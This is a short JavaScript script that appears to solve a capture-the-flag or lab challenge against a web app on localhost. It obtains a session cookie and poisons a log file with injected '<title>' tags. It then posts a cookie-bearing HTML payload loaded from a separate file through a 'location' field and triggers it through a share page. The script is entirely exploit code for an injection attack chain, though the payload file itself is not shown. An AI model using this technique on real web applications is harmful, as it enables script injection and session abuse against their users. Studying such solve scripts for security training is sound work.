import fs from 'fs';

// Step 1: generate a new user
let homeRsp = await fetch('http://localhost:57291/');
let cookie = homeRsp.headers.get('Set-Cookie').split(';')[0];

let payload = fs.readFileSync('payload.html').toString().replace(/\$\$COOKIEVAL/g, cookie);

console.log(cookie);

// Poison log file
await fetch('http://localhost:57291/' + encodeURIComponent('<title>'), { headers: { 'Cookie': cookie } });
await fetch('http://localhost:57291/' + encodeURIComponent('</title>'), { headers: { 'Cookie': cookie } });

let rsp = await fetch('http://localhost:57291/post', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie
    },
    body: new URLSearchParams({ content: 'Hi', location: payload })
})

console.log(await rsp.text());

// Start payload execution
let rsp2 = await fetch('http://localhost:57291/share/1', {
    headers: {
        'Cookie': cookie
    }
});

console.log(await rsp2.text());
